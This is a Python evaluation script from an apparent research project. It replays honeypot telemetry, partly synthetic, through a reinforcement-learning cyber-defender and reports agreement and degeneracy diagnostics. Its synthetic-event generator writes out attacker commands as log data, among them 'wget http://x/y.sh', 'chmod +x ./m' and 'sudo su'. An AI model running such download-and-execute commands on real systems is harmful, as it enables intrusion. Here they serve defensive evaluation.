"""
shadow_eval.py  –  Offline shadow-mode evaluation of the trained defender
==========================================================================
Phase-D (realism / grounding) result for the paper. Replays a recorded honeypot
telemetry window through the simulator-trained defender policy and reports what
it actually does with real events.

Integrity note (mirrors PROJECT_CONTEXT.md §15): this is a controlled shadow
evaluation, NOT a calibrated, deployment-ready defender — the heuristic is a
proxy for analyst ground truth, not a labelled dataset. Nothing here executes
against a live host.

Why this harness was rebuilt
----------------------------
The first version fed the policy a *frozen* SOC posture: evidence, alerts,
decoys, containment and rate-limit were hardcoded to zero for every window, and
`hosts_anomalous / max_footholds` saturated at 1.0. Seven of twelve observation
dims never moved, so the defender emitted `threat_hunt` for all 20 windows — a
constant policy that the "65% reasonable agreement" headline concealed. That is
not a policy failure: in-sim, "anomalies present, no evidence" is exactly when
hunting is correct. It was a degenerate input.

Two changes make the number mean something:
  1. **The loop is closed** — the recommended action feeds back through
     `SocState` (see soc_state.py), so evidence accrues while the SOC
     investigates, containment fires once it clears the bar, and the posture
     the next observation sees reflects what was just recommended.
  2. **Episodes are segmented** — the advisor's LSTM state is reset every
     `--episode-windows` windows. Training episodes at level 2 run ~7 steps;
     threading one unbroken rollout across every window of a capture put the
     recurrent state far outside its training distribution.

The report now carries the diagnostics that would have caught the original
failure: an action distribution, its **entropy**, and an explicit
`constant_policy` flag. A degenerate run is reported as degenerate.

Inputs (pick one):
  --events PATH    a JSON list of Elasticsearch `_source` objects (a recorded
                   honeypot window), or {"hits": {"hits": [{"_source": ...}]}}
  --es-url URL     query a live Elasticsearch instead
  --synthetic N    generate N synthetic events for a runnable smoke / scaffold

Usage:
  venv/Scripts/python.exe src/server/rl/shadow_eval.py --synthetic 400 \
      --out ../../../public/rl-artifacts/shadow_eval.json
  venv/Scripts/python.exe src/server/rl/shadow_eval.py --events window.json
"""

import argparse
import json
import math
import os
import random
from collections import Counter, defaultdict
from typing import Dict, List

DEF_ACTION_NAMES = [
    "monitor", "investigate", "rate_limit", "deploy_decoy", "threat_hunt",
    "isolate_host", "hard_block", "patch_harden", "rotate_credentials",
    "restore_backup", "raise_alert", "deception_response",
]

# Actions a reasonable analyst could justifiably take for a given situation.
REASONABLE = {
    "creds":   {"isolate_host", "rotate_credentials", "hard_block", "threat_hunt"},
    "exfil":   {"investigate", "isolate_host", "hard_block", "rate_limit"},
    "brute":   {"rate_limit", "hard_block", "monitor", "raise_alert"},
    "scan":    {"threat_hunt", "monitor", "investigate", "deploy_decoy"},
    "noise":   {"monitor", "investigate"},
    "quiet":   {"monitor", "deploy_decoy"},
}


def analyst_heuristic(summary: Dict[str, float]) -> str:
    """A deliberately simple, documented SOC-analyst rule used as a proxy for
    ground truth. Returns the single 'expected' action; REASONABLE gives the
    acceptable set for the 'reasonable agreement' metric."""
    if summary["priv_esc_attempts"] > 0:
        return "isolate_host"               # privilege escalation → contain
    if summary["downloads"] > 0:
        return "investigate"                # tooling pulled down → dig in
    if summary["failed_logins"] >= 20:
        return "rate_limit"                 # brute force → throttle
    if summary["port_scan"]:
        return "threat_hunt"                # recon → hunt
    if summary["failed_logins"] >= 5:
        return "monitor"
    return "monitor"


def situation(summary: Dict[str, float]) -> str:
    if summary["priv_esc_attempts"] > 0:
        return "creds"
    if summary["downloads"] > 0:
        return "exfil"
    if summary["failed_logins"] >= 20:
        return "brute"
    if summary["port_scan"]:
        return "scan"
    if summary["failed_logins"] >= 5:
        return "noise"
    return "quiet"


def entropy_bits(counts: Counter) -> float:
    """Shannon entropy of the action distribution, in bits. 0.0 means the
    policy emitted a single action — the failure this harness must surface."""
    total = sum(counts.values())
    if total == 0:
        return 0.0
    return -sum((c / total) * math.log2(c / total)
                for c in counts.values() if c > 0)


def load_events(args) -> List[dict]:
    if args.synthetic:
        return _synthetic_events(args.synthetic)
    if args.events:
        with open(args.events) as f:
            raw = json.load(f)
        if isinstance(raw, dict):
            return raw.get("hits", {}).get("hits", raw.get("events", []))
        return raw
    if args.es_url:
        from telemetry_adapter import TelemetryAdapter
        return TelemetryAdapter(es_url=args.es_url, window=args.window).fetch_events()
    raise SystemExit("provide --events, --es-url, or --synthetic")


def _synthetic_events(n: int) -> List[dict]:
    """Generate a labelled-feel honeypot window for a runnable scaffold. Clearly
    synthetic — for smoke-testing the pipeline and producing a sample artifact.

    Sessions arrive in bursts of varying intensity rather than uniformly at
    random: a capture where every window looks identical cannot distinguish a
    responsive policy from a constant one.
    """
    rng = random.Random(7)
    ips = [f"185.220.10.{i}" for i in range(1, 6)]
    phases = ["recon", "brute", "access", "quiet"]
    out: List[dict] = []
    for i in range(n):
        phase = phases[(i // 25) % len(phases)]
        ip = rng.choice(ips[: 2 if phase == "quiet" else len(ips)])
        session = f"s{i % 40}"
        roll = rng.random()
        if phase == "recon":
            ev = ({"eventid": "cowrie.command.input", "input": "nmap -sS 10.0.0.0/24"}
                  if roll < 0.5 else {"eventid": "cowrie.session.connect"})
        elif phase == "brute":
            ev = ({"eventid": "cowrie.login.failed"} if roll < 0.9
                  else {"eventid": "cowrie.session.connect"})
        elif phase == "access":
            if roll < 0.4:
                ev = {"eventid": "cowrie.command.input",
                      "input": rng.choice(["sudo su", "chmod +x ./m", "wget http://x/y.sh"])}
            elif roll < 0.7:
                ev = {"eventid": "cowrie.session.file_download"}
            else:
                ev = {"eventid": "cowrie.login.failed"}
        else:
            ev = ({"eventid": "cowrie.session.connect"} if roll < 0.8
                  else {"eventid": "cowrie.login.failed"})
        ev.update({"src_ip": ip, "session": session})
        out.append({"_source": ev})
    return out


def evaluate(events, advisor, adapter, soc, *, window_size, episode_windows,
             frozen_state) -> dict:
    """Roll the defender over `events` and score it. Returns the metric block
    shared by the main result and the frozen baseline."""
    actions: Counter = Counter()
    by_situation: Dict[str, Counter] = defaultdict(Counter)
    n_windows = exact = reasonable = 0
    rows = []

    advisor.reset()
    soc.reset()

    for start in range(0, len(events), window_size):
        window  = events[start:start + window_size]
        summary = adapter.summarize(window)   # staticmethod on the passed adapter

        # Segment into engagements: reset the recurrent state and the SOC
        # posture so each episode is in-distribution for a policy trained on
        # ~7-step episodes.
        if n_windows and n_windows % episode_windows == 0:
            advisor.reset()
            soc.reset()
        elif not frozen_state:
            soc.decay()

        defense_state = None if frozen_state else soc.as_defense_state()
        obs = adapter.build_observation(
            defense_state = defense_state,
            step_fraction = 0.5 if frozen_state
                            else (n_windows % episode_windows) / episode_windows,
            summary       = summary,
        )
        rl_action = advisor.suggest(obs)["action_name"]

        outcome = ({} if frozen_state
                   else soc.advance(DEF_ACTION_NAMES.index(rl_action), summary))

        expected = analyst_heuristic(summary)
        sit      = situation(summary)

        actions[rl_action] += 1
        by_situation[sit][rl_action] += 1
        n_windows  += 1
        exact      += int(rl_action == expected)
        reasonable += int(rl_action in REASONABLE[sit])
        rows.append({"summary": summary, "situation": sit, "rl_action": rl_action,
                     "expected": expected, "reasonable": rl_action in REASONABLE[sit],
                     "evidence": outcome.get("evidence"),
                     "effect": outcome.get("effect")})

    return {
        "n_windows": n_windows,
        "frozen_state": bool(frozen_state),
        "episode_windows": episode_windows,
        "action_distribution": {a: actions.get(a, 0) for a in DEF_ACTION_NAMES},
        "distinct_actions": len(actions),
        "action_entropy_bits": round(entropy_bits(actions), 3),
        # A single action for every window says nothing about the policy's
        # judgement, however good the agreement score looks. Say so explicitly.
        "constant_policy": len(actions) <= 1,
        "confusion_by_situation": {
            sit: dict(counts.most_common()) for sit, counts in by_situation.items()
        },
        "exact_agreement": round(exact / n_windows, 3),
        "reasonable_agreement": round(reasonable / n_windows, 3),
        "containments": soc.justified_containments,
        "false_positives": soc.false_positives,
        "rows": rows[:50],
    }


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--events", help="JSON file of recorded ES events")
    parser.add_argument("--es-url", help="query a live Elasticsearch instead")
    parser.add_argument("--window", default="now-1h")
    parser.add_argument("--synthetic", type=int, default=0,
                        help="generate N synthetic events (scaffold/smoke)")
    parser.add_argument("--window-size", type=int, default=20,
                        help="events per shadow window")
    parser.add_argument("--episode-windows", type=int, default=7,
                        help="windows per engagement before the LSTM state is "
                             "reset (level-2 training episodes run ~7 steps)")
    parser.add_argument("--frozen-state", action="store_true",
                        help="disable the SocState feedback loop — reproduces "
                             "the original degenerate harness for comparison")
    parser.add_argument("--baseline", action="store_true",
                        help="also run the frozen/unsegmented configuration and "
                             "embed it as frozen_baseline (the before/after)")
    parser.add_argument("--model", help="defender .zip (default: best/latest)")
    parser.add_argument("--out", help="write the JSON report here")
    args = parser.parse_args()

    from telemetry_adapter import DefenderAdvisor, TelemetryAdapter  # noqa: PLC0415
    from soc_state import SocState  # noqa: PLC0415

    model_path = args.model or _default_model()
    if not model_path or not os.path.exists(model_path):
        raise SystemExit("no defender model found — pass --model")

    advisor = DefenderAdvisor(model_path)
    adapter = TelemetryAdapter()
    soc     = SocState()
    events  = load_events(args)
    if not events:
        raise SystemExit("no events to evaluate")

    result = evaluate(events, advisor, adapter, soc,
                      window_size     = args.window_size,
                      episode_windows = args.episode_windows,
                      frozen_state    = args.frozen_state)

    report = {
        "model": model_path,
        "n_events": len(events),
        "window_size": args.window_size,
        "synthetic": bool(args.synthetic),
        "note": ("Shadow-mode eval: trained-in-sim defender over honeypot "
                 "telemetry vs a documented analyst heuristic (proxy ground "
                 "truth). Controlled evaluation, not a deployment claim."),
        **result,
    }

    if args.baseline and not args.frozen_state:
        # The frozen, unsegmented configuration is the original harness. Keeping
        # it in the same file makes the before/after auditable rather than a
        # claim in a commit message.
        baseline = evaluate(events, advisor, adapter, soc,
                            window_size     = args.window_size,
                            episode_windows = 10 ** 9,
                            frozen_state    = True)
        baseline.pop("rows", None)
        baseline["note"] = ("Original harness: SOC posture frozen at zero and one "
                            "unbroken LSTM rollout over every window.")
        report["frozen_baseline"] = baseline

    _print_result("result", report)
    if "frozen_baseline" in report:
        _print_result("frozen baseline", report["frozen_baseline"])

    if args.out:
        os.makedirs(os.path.dirname(os.path.abspath(args.out)), exist_ok=True)
        with open(args.out, "w") as f:
            json.dump(report, f, indent=2)
        print(f"wrote {args.out}")


def _print_result(label: str, r: dict) -> None:
    dist = {a: c for a, c in r["action_distribution"].items() if c}
    print(f"\n  [{label}] windows={r['n_windows']}  "
          f"distinct_actions={r['distinct_actions']}  "
          f"entropy={r['action_entropy_bits']:.2f} bits")
    print(f"    exact={r['exact_agreement']}  "
          f"reasonable={r['reasonable_agreement']}  "
          f"containments={r['containments']}")
    print(f"    actions: {dist}")
    if r["constant_policy"]:
        print("    WARNING: one action for every window — the agreement scores "
              "above are not meaningful.")


def _default_model():
    """Newest archived run's best defender, else the save-dir latest. Mirrors
    api.py:_model_path so the harness and the API score the same weights."""
    import glob
    candidates = sorted(
        glob.glob("./models/cyberx_marl/results/*/defender_best.zip"),
        key=os.path.getmtime, reverse=True)
    candidates.append("./models/cyberx_marl/defender_latest.zip")
    return next((c for c in candidates if os.path.exists(c)), None)


if __name__ == "__main__":
    main()
